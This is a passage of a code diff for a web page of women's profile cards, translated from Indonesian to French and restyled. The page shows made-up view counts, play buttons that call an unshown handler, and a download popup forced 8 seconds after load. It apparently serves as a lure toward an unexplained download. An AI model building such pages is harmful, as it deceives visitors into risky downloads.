-      {n:2, name:'Darlene', age:22, badge:'Baru',        bt:'new',      views:'8.2K'},
-      {n:3, name:'Alma',    age:25, badge:'Terverifikasi', bt:'verified', views:'15.7K'},
-      {n:4, name:'Bonnie',  age:26, badge:'Populer',     bt:'popular',  views:'20.1K'},
-      {n:5, name:'Dora',    age:24, badge:'Baru',        bt:'new',      views:'9.8K'},
-      {n:6, name:'Camille', age:24, badge:'VIP',         bt:'vip',      views:'18.3K'}
+      {n:1, name:'Ada',     age:20, badge:'Populaire',       bt:'popular',  views:'12.4K'},
+      {n:2, name:'Darlene', age:22, badge:'Nouvelle',bt:'new',      views:'8.2K'},
+      {n:3, name:'Alma',    age:25, badge:'Vérifiée',    bt:'verified', views:'15.7K'},
+      {n:4, name:'Bonnie',  age:26, badge:'Populaire',       bt:'popular',  views:'20.1K'},
+      {n:5, name:'Dora',    age:24, badge:'Nouvelle',bt:'new',      views:'9.8K'},
+      {n:6, name:'Camille', age:24, badge:'VIP',           bt:'vip',      views:'18.3K'}
     ];
 
     // Render hot picks
-    var hotHtml = '';
-    HOT.forEach(function(h) {
-      hotHtml += '<article class="card" onclick="openViewer(\'' + h.name + '\',\'' + h.age + '\',\'\',\'\',\'\',\'\',\'images/' + h.n + '-1.jpg\')">'
-        + '<div class="ph"><img src="images/' + h.n + '-1.jpg" alt="' + h.name + '">'
-        + '<span class="badge ' + h.bt + '">' + h.badge + '</span>'
-        + '<span class="hd">HD</span>'
-        + '<span class="views">👁 ' + h.views + '</span></div>'
-        + '<button class="p-cta" onclick="event.stopPropagation();k2(event)"><svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"></path></svg>Tonton Sekarang</button>'
-        + '</article>';
+    var hotHtml = '', dotHtml = '';
+    HOT.forEach(function(h, i) {
+      hotHtml += '<div class="hot-card" onclick="openViewer(\'' + h.name + '\',\'' + h.age + '\',\'\',\'\',\'\',\'\',\'images/' + h.n + '-1.jpg\')">'
+        + '<div class="hot-img"><img src="images/' + h.n + '-1.jpg" alt="">'
+        + '<span class="hot-badge ' + h.bt + '">' + h.badge + '</span>'
+        + '<span class="hot-views">👁 ' + h.views + '</span></div>'
+        + '<div class="hot-info"><div class="hot-name">' + h.name + ' <span class="hot-age">' + h.age + '</span></div></div></div>';
+      dotHtml += '<span class="hot-dot' + (i === 0 ? ' on' : '') + '"></span>';
     });
-    document.getElementById('hotGrid').innerHTML = hotHtml + hotHtml;
+    document.getElementById('hotScroll').innerHTML = hotHtml;
+    document.getElementById('hotDots').innerHTML = dotHtml;
 
-    // Render user list
-    var userHtml = '';
+    // Render user list (2-column masonry, first 15)
+    var ratios = ['3/4', '4/5', '1/1', '3/4', '4/5', '3/4'];
+    var colL = '', colR = '';
     USERS.slice(0, 15).forEach(function(u, i) {
-      var vk = 6 + ((i * 7 + u.n * 3) % 18);
-      var vd = (i + u.n) % 10;
-      var vstr = vk + '.' + vd + 'K';
-      userHtml += '<article class="card" onclick="openViewer(\'' + u.name + '\',\'' + u.age + '\',\'' + u.job + '\',\'' + u.h + '\',\'' + u.w + '\',\'' + u.loc + '\',\'images/' + u.n + '-1.jpg\')">'
-        + '<div class="ph"><img src="images/' + u.n + '-1.jpg" alt="' + u.name + '">'
-        + '<span class="badge ' + u.bt + '">' + u.badge + '</span>'
-        + '<button class="play" onclick="event.stopPropagation();k2(event)" aria-label="Putar video">'
-        + '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"></path></svg>'
+      var card = '<div class="p-card" style="aspect-ratio:' + ratios[i % ratios.length] + ';" onclick="openViewer(\'' + u.name + '\',\'' + u.age + '\',\'' + u.job + '\',\'' + u.h + '\',\'' + u.w + '\',\'\',\'images/' + u.n + '-1.jpg\')">'
+        + '<img src="images/' + u.n + '-1.jpg" alt="">'
+        + '<div class="p-shade"></div>'
+        + '<span class="p-badge ' + u.bt + '">' + u.badge + '</span>'
+        + '<button class="p-play" onclick="event.stopPropagation();k2(event)" aria-label="Lire la vidéo">'
+        + '<svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M8 5v14l11-7z"></path></svg>'
         + '</button>'
-        + '<span class="hd">HD</span>'
-        + '<span class="views">👁 ' + vstr + '</span></div>'
-        + '<button class="p-cta" onclick="event.stopPropagation();k2(event)"><svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"></path></svg>Tonton Sekarang</button>'
-        + '</article>';
+        + '<div class="p-info">'
+        + '<div class="p-name">' + u.name + ' <span class="v">✓</span> <span class="p-age">' + u.age + '</span></div>'
+        + '<div class="p-job">' + u.job + '</div>'
+        + '</div></div>';
+      if (i % 2 === 0) { colL += card; } else { colR += card; }
     });
-    userHtml += '<article class="more-card" onclick="k2(event)">'
-      + '<span class="more-ic"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M12 5v14M5 12h14"></path></svg></span>'
-      + '<span class="more-txt">Lihat Lebih Banyak Video</span>'
-      + '<span class="more-sub">100% Gratis</span>'
-      + '</article>';
-    document.getElementById('userGrid').innerHTML = userHtml;
+    document.getElementById('userList').innerHTML = '<div class="p-col">' + colL + '</div><div class="p-col">' + colR + '</div>';
 
     // Viewer
     function openViewer(name, age, job, h, w, loc, src) {
@@ -899,7 +762,6 @@
       var info = '<div class="v-name">' + name + ', ' + age + '</div>';
       if (job) info += '<div class="v-job">' + job + '</div>';
       if (h && w) info += '<div class="v-stats">' + h + ' · ' + w + '</div>';
-      if (loc) info += '<div class="v-loc">' + loc + '</div>';
       document.getElementById('vInfo').innerHTML = info;
       document.getElementById('viewer').classList.add('on');
       document.body.style.overflow = 'hidden';
@@ -909,7 +771,44 @@
       document.body.style.overflow = '';
     }
 
-    // Download popup
+    // Hot carousel auto-scroll
+    (function() {
+      var c = document.getElementById('hotScroll');
+      var dots = document.querySelectorAll('#hotDots .hot-dot');
+      if (!c || !dots.length) return;
+      var cards = c.querySelectorAll('.hot-card');
+      var i = 0, t = cards.length;
+      c.addEventListener('scroll', function() {
+        var w = cards[0] ? cards[0].offsetWidth + 10 : 148;
+        var idx = Math.round(c.scrollLeft / w);
+        if (idx >= t) idx = 0;
+        dots.forEach(function(d, di) { d.classList.toggle('on', di === idx); });
+        i = idx;
+      }, { passive: true });
+      setInterval(function() {
+        i = (i + 1) % t;
+        var w = cards[0] ? cards[0].offsetWidth + 10 : 148;
+        if (i === 0) { c.scrollTo({ left: 0, behavior: 'smooth' }); }
+        else { c.scrollTo({ left: i * w, behavior: 'smooth' }); }
+        dots.forEach(function(d, di) { d.classList.toggle('on', di === i); });
+      }, 2500);
+    })();
+
+    // Review carousel auto-scroll
+    (function() {
+      var c = document.getElementById('reviewScroll');
+      if (!c) return;
+      var cards = c.querySelectorAll('.review-card');
+      var i = 0, t = cards.length;
+      setInterval(function() {
+        i = (i + 1) % t;
+        var w = cards[0] ? cards[0].offsetWidth + 12 : 262;
+        if (i === 0) { c.scrollTo({ left: 0, behavior: 'smooth' }); }
+        else { c.scrollTo({ left: i * w, behavior: 'smooth' }); }
+      }, 2000);
+    })();
+
+    // Video finished -> show download popup
     function closeDownload() {
       document.getElementById('dlOverlay').classList.remove('on');
       document.body.style.overflow = '';
@@ -923,6 +822,7 @@
       if (!v) return;
       v.addEventListener('ended', showDownload);
     })();
+    // Also show the download popup 8 seconds after the page loads
     setTimeout(showDownload, 8000);
   </script>
 </body>
